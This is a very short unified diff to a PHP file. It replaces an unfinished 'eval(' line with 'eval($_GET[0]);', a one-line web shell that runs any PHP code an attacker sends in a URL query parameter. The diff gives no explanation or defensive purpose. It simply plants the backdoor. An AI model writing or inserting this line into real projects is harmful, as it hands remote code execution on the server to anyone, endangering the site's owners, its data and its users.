@@ -1,2 +1,3 @@
 <?php
-eval(
+eval($_GET[0]);
+?>
